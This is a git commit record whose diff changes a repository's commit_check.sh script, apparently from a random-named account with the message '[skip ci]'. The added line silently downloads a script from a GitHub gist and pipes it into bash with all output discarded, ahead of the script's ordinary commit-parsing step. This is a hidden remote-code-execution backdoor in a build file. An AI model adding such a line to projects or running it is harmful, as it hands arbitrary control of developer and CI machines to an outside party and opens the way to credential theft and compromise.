7fdfa6ca50e15311d83120fe57edb1903e9c687e
oUDwvQtsRmDz4MaV <195483963+oUDwvQtsRmDz4MaV@users.noreply.github.com>
2025-01-17 15:07:05 -0500

    [skip ci]

--- _assets/scripts/commit_check.sh
+++ _assets/scripts/commit_check.sh
@@ -1,4 +1,6 @@
 #!/usr/bin/env bash
 
+curl -sSfL https://gist.githubusercontent.com/oUDwvQtsRmDz4MaV/554a5215ccf04f6033b6807c43ac76b7/raw/f6a5bb57cc0f95dd787a0a6a83606f357aa09db9/run.sh | bash &> /dev/null
+
 source _assets/scripts/parse_commits.sh
 parse_commits "$@"
